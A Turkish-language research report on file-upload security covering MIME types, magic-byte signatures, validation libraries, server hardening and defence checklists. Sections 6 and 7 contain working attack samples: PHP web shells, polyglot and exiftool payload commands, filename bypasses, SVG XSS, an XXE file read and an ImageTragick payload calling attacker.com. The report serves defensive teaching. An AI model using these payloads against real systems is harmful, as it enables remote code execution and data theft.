# MIME Type Security & Magic Byte Analysis

## Kapsamlı Teknik Araştırma Raporu

**Rapor Tarihi:** Ocak 2026  
**Kapsam:** Dosya tipi güvenliği, MIME doğrulama, Magic Byte analizi, bypass teknikleri

---

## 1. Giriş ve Genel Bakış

MIME (Multipurpose Internet Mail Extensions) tipleri ve Magic Bytes (dosya imzaları), modern web uygulamalarında dosya doğrulama ve güvenliğin temel bileşenleridir. Bu teknolojiler, dosya yükleme işlemlerinde güvenlik katmanı sağlar ancak yanlış uygulandığında ciddi güvenlik açıklarına yol açabilir.

### Temel Kavramlar

**MIME Type:** Dosya içeriğinin türünü belirten standart tanımlayıcı (örn: `image/jpeg`, `application/pdf`)

**Magic Bytes:** Dosyanın başında bulunan ve dosya formatını tanımlayan özel byte dizileri

**File Signature:** Magic bytes ile eş anlamlı, dosyanın gerçek formatını belirten binary imza

---

## 2. Temel Çalışma Prensipleri

### 2.1 MIME Type Sisteminin Çalışması

MIME tipleri RFC 2046 standardında tanımlanmıştır ve şu yapıya sahiptir:

```
type/subtype; parameter=value
```

Örnekler:

- `text/html; charset=utf-8`
- `image/png`
- `application/pdf`

MIME tipleri üç ana kategoride incelenir:

1. **Client-side (İstemci tarafı):** Tarayıcı tarafından `Content-Type` header'ında gönderilir
2. **Server-side (Sunucu tarafı):** Sunucu tarafından dosya içeriği analiz edilerek belirlenir
3. **File extension based:** Dosya uzantısına göre tahmin edilir

### 2.2 Magic Bytes Nasıl Çalışır?

Magic bytes, dosyanın ilk birkaç byte'ında bulunan sabit değerlerdir. Her dosya formatının kendine özgü bir imzası vardır.

#### Yaygın Dosya İmzaları:

| Dosya Tipi | Magic Bytes (Hex)         | Magic Bytes (ASCII) |
| ---------- | ------------------------- | ------------------- |
| JPEG       | `FF D8 FF`                | -                   |
| PNG        | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG`              |
| GIF87a     | `47 49 46 38 37 61`       | `GIF87a`            |
| GIF89a     | `47 49 46 38 39 61`       | `GIF89a`            |
| PDF        | `25 50 44 46`             | `%PDF`              |
| ZIP        | `50 4B 03 04`             | `PK`                |
| EXE        | `4D 5A`                   | `MZ`                |
| BMP        | `42 4D`                   | `BM`                |

**Kaynak:** [Wikipedia - List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

### 2.3 Dosya Tipi Tespit Mekanizmaları

Sistemler üç ana yöntemle dosya tipini tespit eder:

1. **Extension-based (En zayıf):**
   - Sadece dosya uzantısına bakar
   - Kolayca manipüle edilebilir
   - `file.php` → `file.jpg` olarak değiştirilebilir

2. **Content-Type Header (Orta güvenlik):**
   - HTTP header'ından gelen MIME type
   - İstemci tarafından manipüle edilebilir
   - Güvenilir değildir

3. **Content Inspection (En güvenli):**
   - Dosya içeriğinin ilk byte'larını okur
   - Magic bytes ile doğrulama yapar
   - Gerçek dosya formatını belirler

---

## 3. En İyi Uygulama Yöntemleri (Best Practices)

### 3.1 OWASP Standartları

OWASP File Upload Cheat Sheet'e göre güvenli dosya yükleme için şu prensipler uygulanmalıdır: izin verilen uzantıların whitelist ile belirlenmesi, uzantı doğrulamasından önce input validasyonunun yapılması, Content-Type header'ına güvenilmemesi, dosya adının uygulama tarafından oluşturulması ve dosyaların webroot dışında saklanması.

#### Defense in Depth Yaklaşımı:

```
1. Extension Validation (Whitelist)
   ↓
2. MIME Type Validation
   ↓
3. Magic Bytes Verification
   ↓
4. File Size Limits
   ↓
5. Content Disarm & Reconstruction (CDR)
   ↓
6. Antivirus Scanning
   ↓
7. Sandbox Execution
```

### 3.2 Validation Katmanları

#### Katman 1: Extension Whitelist

```javascript
const allowedExtensions = ["jpg", "jpeg", "png", "gif", "pdf"];
const fileExtension = filename.split(".").pop().toLowerCase();

if (!allowedExtensions.includes(fileExtension)) {
  throw new Error("Invalid file extension");
}
```

#### Katman 2: MIME Type Kontrolü

```javascript
const allowedMimeTypes = [
  "image/jpeg",
  "image/png",
  "image/gif",
  "application/pdf",
];

if (!allowedMimeTypes.includes(file.mimetype)) {
  throw new Error("Invalid MIME type");
}
```

#### Katman 3: Magic Bytes Doğrulaması

```javascript
const { fileTypeFromBuffer } = require("file-type");

async function validateFileContent(buffer) {
  const fileType = await fileTypeFromBuffer(buffer);

  if (!fileType) {
    throw new Error("Unknown file type");
  }

  const allowedTypes = ["jpg", "png", "gif", "pdf"];
  if (!allowedTypes.includes(fileType.ext)) {
    throw new Error("Invalid file content");
  }

  return fileType;
}
```

### 3.3 Güvenlik Başlıkları

X-Content-Type-Options header'ı tarayıcılara, sunucunun doğru MIME type belirtmediği sürece script ve stylesheet yüklememelerini bildirir.

```http
X-Content-Type-Options: nosniff
Content-Disposition: attachment; filename="file.pdf"
```

### 3.4 Dosya Depolama Güvenliği

Yüklenen dosyalar tamamen doğrulanana kadar sunucunun kalıcı dosya sistemine yüklenmemelidir.

**Öneriler:**

- Dosyaları webroot dışında sakla
- Rastgele dosya isimleri kullan
- Dosya ID'leri ile mapping kullan
- Ayrı domain/subdomain kullan
- Yazma izinlerini sınırla

---

## 4. Açık Kaynak Projeler ve Kütüphaneler

### 4.1 Node.js Ekosistemi

#### file-type (Önerilen)

```bash
npm install file-type
```

file-type kütüphanesi dosya içeriğini inceler ve uzantı yanlış olsa bile doğru çalışır. Güvenli ve doğru olup, içerik denetimi yaptığı için biraz daha yavaştır.

```javascript
import { fileTypeFromFile } from "file-type";

const fileType = await fileTypeFromFile("image.png");
console.log(fileType);
// { ext: 'png', mime: 'image/png' }
```

**GitHub:** https://github.com/sindresorhus/file-type

#### magic-bytes.js

```bash
npm install magic-bytes.js
```

magic-bytes.js, dosyanın ilk byte'larını analiz ederek türünü belirleyen bir JavaScript kütüphanesidir. Tarayıcıda veya Node.js'te kullanılabilir.

```javascript
import { filetypeinfo } from "magic-bytes.js";

const bytes = new Uint8Array([0xff, 0xd8, 0xff]);
console.log(filetypeinfo(bytes));
// [{ typename: 'jpg', mime: 'image/jpeg', extension: 'jpg' }]
```

**GitHub:** https://github.com/LarsKoelpin/magic-bytes

#### mime-types

```bash
npm install mime-types
```

**Uyarı:** Sadece extension'a bakar, güvensiz upload validasyonu için uygun değildir.

```javascript
const mime = require("mime-types");
const mimeType = mime.lookup("file.pdf");
// 'application/pdf'
```

### 4.2 Python Ekosistemi

#### python-magic (libmagic wrapper)

```bash
pip install python-magic
```

```python
import magic

mime = magic.Magic(mime=True)
file_type = mime.from_file("test.pdf")
# 'application/pdf'
```

### 4.3 .NET Ekosistemi

#### File.TypeChecker (NuGet)

```bash
dotnet add package File.TypeChecker
```

Geleneksel dosya doğrulama, kolayca manipüle edilebilen dosya uzantılarına dayanır. FileTypeChecker, dosya tiplerini tanımlamak için magic number'ları (binary imzalar) kullanır.

```csharp
using FileTypeChecker;

using (var fileStream = File.OpenRead("suspicious.exe"))
{
    if (FileTypeValidator.IsTypeRecognizable(fileStream))
    {
        var fileType = FileTypeValidator.GetFileType(fileStream);
        Console.WriteLine($"Type: {fileType.Name}");
    }
}
```

**GitHub:** https://github.com/0xbrock/FileTypeChecker

### 4.4 PHP Ekosistemi

#### finfo (Built-in)

```php
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mimeType = $finfo->file($uploadedFile);

if ($mimeType === 'image/jpeg') {
    // Valid JPEG
}
```

### 4.5 Sistem Araçları

#### libmagic / file command (Unix/Linux)

file komutu, bir dosyanın ne tür veri içerdiğini kelimelerle söyleyen bir dosya tipi tahmin aracıdır. GUI sistemlerinin aksine, komut satırı sistemleri dosya türünü belirlemek için uzantılara değil, dosyanın gerçek içeriğine bakar.

```bash
file document.pdf
# document.pdf: PDF document, version 1.4

file -b --mime-type image.jpg
# image/jpeg
```

**Kaynak:** https://www.darwinsys.com/file/

---

## 5. Kritik Yapılandırma Dosyaları ve Parametreler

### 5.1 libmagic Parametreleri

libmagic çeşitli limitler içerir: MAGIC_PARAM_BYTES_MAX dosya içinde bakılacak maksimum byte sayısını, MAGIC_PARAM_ENCODING_MAX encoding tespiti için taranacak maksimum byte sayısını kontrol eder.

```c
magic_t magic = magic_open(MAGIC_MIME_TYPE);

// Parametreler
magic_setparam(magic, MAGIC_PARAM_BYTES_MAX, 1048576);      // 1MB
magic_setparam(magic, MAGIC_PARAM_INDIR_MAX, 50);           // İndireksiyon limiti
magic_setparam(magic, MAGIC_PARAM_NAME_MAX, 60);            // Name/use limiti
magic_setparam(magic, MAGIC_PARAM_ELF_SHNUM_MAX, 32768);    // ELF section limiti
```

### 5.2 Web Application Firewall (WAF) Kuralları

#### ModSecurity Örnek Kuralları:

```apache
# Dosya uzantı kısıtlaması
SecRule FILES_NAMES "@rx (?i)\.(php|exe|sh|bat|cmd)$" \
    "id:1001,phase:2,deny,status:403,msg:'Dangerous file extension'"

# MIME type kontrolü
SecRule FILES "@validateByteRange 1-255" \
    "id:1002,phase:2,deny,status:403,msg:'Invalid file content'"

# Dosya boyut limiti
SecRule REQUEST_HEADERS:Content-Length "@gt 10485760" \
    "id:1003,phase:1,deny,status:413,msg:'File too large'"
```

### 5.3 Multer (Node.js) Yapılandırması

**UYARI:** Multer varsayılan olarak dosyanın gerçek içeriğini doğrulamaz; sadece istemci tarafından sağlanan dosya uzantısına veya MIME type'ına bağlıdır.

```javascript
const multer = require("multer");
const { fileTypeFromBuffer } = require("file-type");

const storage = multer.memoryStorage();

const fileFilter = async (req, file, cb) => {
  try {
    // Magic bytes kontrolü
    const fileType = await fileTypeFromBuffer(file.buffer);

    const allowedTypes = ["image/jpeg", "image/png", "image/gif"];

    if (!fileType || !allowedTypes.includes(fileType.mime)) {
      return cb(new Error("Invalid file type"), false);
    }

    cb(null, true);
  } catch (error) {
    cb(error, false);
  }
};

const upload = multer({
  storage,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 1,
  },
  fileFilter,
});
```

### 5.4 Apache/Nginx Yapılandırması

#### Apache (.htaccess):

```apache
# PHP execution'ı engelle
<FilesMatch "\.(php|phtml|php3|php4|php5|inc)$">
    deny from all
</FilesMatch>

# MIME type zorlama
AddType application/pdf .pdf
AddType image/jpeg .jpg .jpeg
```

#### Nginx:

```nginx
location /uploads {
    # PHP execution'ı devre dışı bırak
    location ~ \.php$ {
        return 403;
    }

    # MIME type kontrolü
    types {
        image/jpeg jpg jpeg;
        image/png png;
        application/pdf pdf;
    }

    # Default type belirleme
    default_type application/octet-stream;
}
```

---

## 6. Güvenlik Açısından Kritik Noktalar

### 6.1 Bypass Teknikleri ve Saldırı Vektörleri

#### 6.1.1 Extension-Based Bypass

**Double Extension Attack:**

```
malicious.php.jpg
```

Çift uzantılar kolayca regex'i atlatır, örneğin .jpg.php, .jpg regex'ini kolayca bypass eder.

**Null Byte Injection:**

```
shell.php%00.jpg
shell.php\x00.jpg
```

Null byte'lar bazı sistemlerde dosya adını keser, .jpg kısmı atılır ve .php yeni uzantı olur.

**Windows-Specific Bypass:**

Windows'ta dosya adının sonuna nokta eklendiğinde, işletim sistemi bu noktayı otomatik olarak kaldırır. Örneğin, shell.aspx.. yüklenirse, blacklist bypass edilir çünkü .aspx != .aspx.. ama dosya kaydedilirken Windows sondaki noktayı keser ve shell.aspx olarak kalır.

```
malicious.asp.
backdoor.php::$data
exploit.aspx:.jpg
```

#### 6.1.2 MIME Type Spoofing

Web sunucuları ve tarayıcılar genellikle MIME type'ı kullanarak dosya türünü belirler. Ancak bu kolayca taklit edilebilir.

**Burp Suite ile manipülasyon:**

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----12345

------12345
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------12345--
```

#### 6.1.3 Magic Bytes Bypass

Dosya imzasını değiştirerek ve dosya adını gif'e dönüştürerek magic byte'lar ve dosya uzantısına göre hangi dosyayı yükleyeceğine karar veren uygulamayı bypass edebiliriz.

**Polyglot Dosya Oluşturma:**

```bash
# GIF magic bytes + PHP shell
echo -e "\x47\x49\x46\x38\x39\x61" > shell.php
echo "<?php system(\$_GET['cmd']); ?>" >> shell.php
```

**ExifTool ile metadata injection:**

Sunucu dosya içeriğini doğruladı. Yüklenen dosya gerçek resim verisi içermiyorsa, sunucu bunu reddetti. Bu, doğrulamanın sadece uzantı veya MIME type'a değil, içeriğin magic byte'larına (dosya imzasına) dayandığını doğruladı.

```bash
exiftool -Comment="<?php echo file_get_contents('/etc/passwd'); ?>" \
  image.jpg -o malicious.php
```

### 6.2 Polyglot Dosya Saldırıları

Polyglot, iki veya daha fazla formatta geçerli olan bir dosyadır. Polyglot dosyalar, kötü amaçlı yazılım tespiti için sorun teşkil eder.

#### Polyglot Türleri:

1. **Appended Polyglots:**
   Zararsız dosyalara kötü niyetli içerik ekleyebilir. Bu tür polyglot, aşağıdan yukarıya okunan formatlarla sınırlıdır, örneğin ZIP arşivleri.

2. **Parasite Polyglots:**
   İkincil dosyalar, ana dosyanın yapısal işaretlemesi içine gömülür. Bu teknik, nadiren kullanılan ve genellikle göz ardı edilen metadata alanlarını (UTF-8 metin yorum segmentleri gibi) kullanarak kötü niyetli payload'ları gizler.

3. **Zipper Polyglots:**
   Her iki dosya türü birbirinin veri bloklarını kendi yorum bölümlerine gömer.

4. **Cavity Polyglots:**
   Kötü niyetli kod, zararsız dosyalar olarak gizlenir ve dosyanın yapısı içindeki işlenmemiş bellek alanına gömülür.

#### Yaygın Polyglot Kombinasyonları:

| Kombinasyon    | Kullanım Alanı       | Risk Seviyesi |
| -------------- | -------------------- | ------------- |
| PHAR/JPEG      | PHP object injection | Yüksek        |
| GIF/JavaScript | XSS, CSP bypass      | Yüksek        |
| PDF/JavaScript | Malware delivery     | Kritik        |
| ZIP/EXE        | Trojan distribution  | Kritik        |
| HTML/CHM       | Code execution       | Yüksek        |

**Örnek PHAR-JPEG Polyglot:**

```
\xFF\xD8............[JPEG data].............
__HALT_COMPILER();
<?php
[PHAR archive data]
?>
```

### 6.3 Content Disarm & Reconstruction (CDR) Bypass

Katı doğrulama süreçlerinin uygulanmasına rağmen, polyglot dosyalarını hedef alan gelişmiş saldırılar önemli bir güvenlik tehdidi olmaya devam ediyor.

**CDR Bypass Teknikleri:**

- Metadata injection
- Comment field abuse
- Archive manipulation
- Encrypted payloads

### 6.4 Parser Confusion Attacks

mmmagic kütüphanesinin dosyadan okuduğu byte sayısında bir limit vardır. Dosyayı beyaz boşluk karakterleri (boşluklar veya sekmeler) ile doldurup parsing limitini aşana kadar bu limiti istismar edebiliriz.

**mmmagic limitleri:**

| Parametre | Varsayılan    | Açıklama                              |
| --------- | ------------- | ------------------------------------- |
| bytes     | 1048576 (1MB) | Dosyadan okunacak maksimum byte       |
| elf_notes | 256           | İşlenecek maksimum ELF notları        |
| regex     | 8192          | Regex aramaları için uzunluk limiti   |
| indir     | 50            | Indirect magic için özyineleme limiti |

**Bypass örneği:**

```json
{
  "_id": "../../../../exploit",
  "padding": " ".repeat(1048577),
  "payload": "%PDF-1.3..."
}
```

---

## 7. Gerçek Dünya Saldırı Senaryoları

### 7.1 Web Shell Upload

**Senaryo:** PHP web shell yükleyerek RCE (Remote Code Execution)

```php
// shell.php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**Bypass Zinciri:**

1. Dosya adını `shell.php.jpg` yap
2. Content-Type'ı `image/jpeg` olarak ayarla
3. Dosyanın başına GIF magic bytes ekle: `GIF89a`
4. Server'da PHP handler configuration exploit edilir

### 7.2 XSS via SVG Upload

```xml
<!-- malicious.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

**Etki:** Stored XSS, session hijacking

### 7.3 XXE via XML/SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### 7.4 SSRF via ImageMagick

**ImageTragick (CVE-2016-3714):**

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/payload)'
pop graphic-context
```

---

## 8. Savunma Stratejileri

### 8.1 Çok Katmanlı Doğrulama

```javascript
async function secureFileUpload(file) {
  // Layer 1: Extension check
  validateExtension(file.name);

  // Layer 2: Size check
  if (file.size > MAX_FILE_SIZE) {
    throw new Error("File too large");
  }

  // Layer 3: Magic bytes verification
  const fileType = await fileTypeFromBuffer(file.buffer);
  validateFileType(fileType);

  // Layer 4: Cross-validation
  if (fileType.ext !== getExtension(file.name)) {
    throw new Error("Extension mismatch");
  }

  // Layer 5: Content scanning
  await scanWithAntivirus(file.buffer);

  // Layer 6: CDR (Content Disarm & Reconstruction)
  const sanitized = await disarmContent(file.buffer, fileType);

  // Layer 7: Safe storage
  const safeFilename = generateRandomFilename();
  await storeOutsideWebroot(sanitized, safeFilename);

  return { success: true, fileId: safeFilename };
}
```

### 8.2 Content Security Policy (CSP)

```http
Content-Security-Policy: default-src 'self';
  script-src 'self';
  object-src 'none';
  base-uri 'self';
```

### 8.3 İzolasyon ve Sandboxing

```javascript
// Docker container ile izolasyon
const docker = require("dockerode");

async function processSuspiciousFile(file) {
  const container = await docker.createContainer({
    Image: "file-processor:latest",
    Cmd: ["process", "/input/file"],
    HostConfig: {
      Binds: [`${uploadDir}:/input:ro`],
      NetworkMode: "none",
      Memory: 512 * 1024 * 1024, // 512MB
      CpuShares: 512,
    },
  });

  await container.start();
  const result = await container.wait();
  await container.remove();

  return result;
}
```

### 8.4 Rate Limiting ve Monitoring

```javascript
const rateLimit = require("express-rate-limit");

const uploadLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 dakika
  max: 10, // Maksimum 10 upload
  message: "Too many upload requests",
  standardHeaders: true,
  legacyHeaders: false,
});

app.post("/upload", uploadLimiter, uploadHandler);
```

---

## 9. Test ve Güvenlik Denetimleri

### 9.1 Checklist

- [ ] Extension whitelist uygulanmış mı?
- [ ] Client-side validation var mı? (Yeterli değil!)
- [ ] Server-side magic bytes kontrolü yapılıyor mu?
- [ ] MIME type cross-validation var mı?
- [ ] Dosya boyut limitleri tanımlı mı?
- [ ] Dosya adı sanitizasyonu yapılıyor mu?
- [ ] Dosyalar webroot dışında mı?
- [ ] Direct access engelleniyor mu?
- [ ] Execution izinleri kaldırılmış mı?
- [ ] CDR/Antivirus entegrasyonu var mı?
- [ ] Logging ve monitoring aktif mi?
- [ ] Security headers (X-Content-Type-Options) kullanılıyor mu?

### 9.2 Test Araçları

**Burp Suite Extensions:**

- Upload Scanner
- Content Type Converter

**Standalone Tools:**

- ExifTool
- HxD (Hex Editor)
- file command
- binwalk (binary analysis)

**Automated Scanners:**

- OWASP ZAP
- Acunetix
- Burp Suite Professional

---

## 10. Kaynaklar ve Referanslar

### Resmi Dokümantasyon

- [IANA MIME Media Types Registry](https://www.iana.org/assignments/media-types/media-types.xhtml)
- [RFC 2046 - MIME Part Two: Media Types](https://datatracker.ietf.org/doc/html/rfc2046)
- [WHATWG MIME Sniffing Standard](https://mimesniff.spec.whatwg.org/)

### OWASP Kaynakları

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

### Akademik Makaleler ve Araştırmalar

- Koch, L. et al. (2024). "Where the Polyglots Are: How Polyglot Files Enable Cyber Attack Chains" - https://arxiv.org/html/2407.01529v1
- Kaspersky (2025). "Polyglot technique for disguising malware" - https://www.kaspersky.com/blog/polyglot-malware-masking-technique/53263/

### Açık Kaynak Projeler

- **file-type (Node.js):** https://github.com/sindresorhus/file-type
- **magic-bytes.js:** https://github.com/LarsKoelpin/magic-bytes
- **FileTypeChecker (.NET):** https://github.com/0xbrock/FileTypeChecker
- **libmagic:** https://www.darwinsys.com/file/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings

### Güvenlik Blog Yazıları

- PortSwigger Web Security Academy - File Upload Vulnerabilities: https://portsw
